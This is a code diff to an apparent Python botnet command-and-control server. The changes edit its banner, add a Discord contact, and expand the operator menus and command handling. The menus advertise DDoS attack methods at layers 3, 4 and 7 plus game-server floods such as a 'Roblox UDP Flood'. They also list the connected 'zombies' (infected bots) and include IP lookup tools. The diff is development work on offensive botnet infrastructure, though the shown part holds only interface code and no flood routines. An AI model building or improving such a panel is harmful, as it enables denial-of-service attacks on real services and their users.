@@ -40,8 +40,8 @@ def text2Gen():
     word = '''
 ╔════════════════════════════════════╗
 ║      type "help" for commands      ║
-╠════════════════════════════════════╝
-╚─────────────> CirqueiraDev
+║         Discord: cirueira          ║
+╚════════════════════════════════════╝
 '''
 # ─────
     start_color = (0, 0, 200)
@@ -97,12 +97,23 @@ rules = f"""
 """
 
 help = f"""
+{gray}List of commands:
 {lightwhite}HELP         {gray}Shows list of commands   
 {lightwhite}BOTNET       {gray}Shows list of botnet methods
+{lightwhite}METHODS      {gray}Shows Methods List
 {lightwhite}BOTS         {gray}Shows available zombies
 {lightwhite}TOOLS        {gray}Shows list of tools    
 {lightwhite}CLEAR        {gray}Clears the screen          
 {lightwhite}EXIT         {gray}Disconnects from the net
+"""
+
+showMethods = f"""
+{gray}List of Methods:
+{lightwhite}L3               {gray}Show all L3 Methods
+{lightwhite}L4               {gray}Show all L4 Methods  
+{lightwhite}HTTP             {gray}Show all L7 Methods  
+{lightwhite}GAMES            {gray}Show all Games Methods
+{lightwhite}BOTNET           {gray}Show all Methods  
 """
 
 Methods_L3 = f"""
@@ -138,17 +149,20 @@ GameMethods = f"""
 {lightwhite}.ROBLOX            {gray}Roblox UDP Flood
 """
 
-botnetMethods = f"""{Methods_L3}{Methods_L4}{Methods_L7}{GameMethods}"""
-
 tools = f"""
+{gray}List of Tools:
 {lightwhite}!GETIP         {gray}Get ip from URL      
 {lightwhite}!GEOIP         {gray}Get info from ip
 """
 
 admin_commands = f"""
+{gray}Admin Commands:
 {lightwhite}!REG                {gray}Starts registration server
 {lightwhite}!USER               {gray}Add/List/remove users
 """
+
+# LOL...
+botnetMethods = f"""{Methods_L3}{Methods_L4}{Methods_L7}{GameMethods}"""
 
 bots = {}
 user_name = ""
@@ -353,6 +367,11 @@ def user(args, send, client):
     except:
         send(client, '\n!USER ADD/LIST/REMOVE\n')
 
+def clear(client):
+    send(client, ansi_clear, False)
+    for x in banner.split('\n'):
+        send(client, '\x1b[3;31;48m'+ x)
+
 # Updates Shell Title
 def update_title(client, name, expires):
     while 1:
@@ -380,6 +399,8 @@ def command_line(client, username):
             command = args[0].upper()
             print(user_name, args)
 
+            clear(client)
+
             if command == 'HELP':
                 for x in help.split('\n'):
                     send(client, '\x1b[3;31;40m'+ x)
@@ -396,8 +417,12 @@ def command_line(client, username):
                 for x in Methods_L4.split('\n'):
                     send(client, '\x1b[3;31;40m'+ x)
 
-            elif command == 'L7':
+            elif command == 'L7' or command == 'HTTP':
                 for x in Methods_L7.split('\n'):
+                    send(client, '\x1b[3;31;40m'+ x)
+
+            elif command == 'METHODS':
+                for x in showMethods.split('\n'):
                     send(client, '\x1b[3;31;40m'+ x)
 
             elif command == 'GAMES':
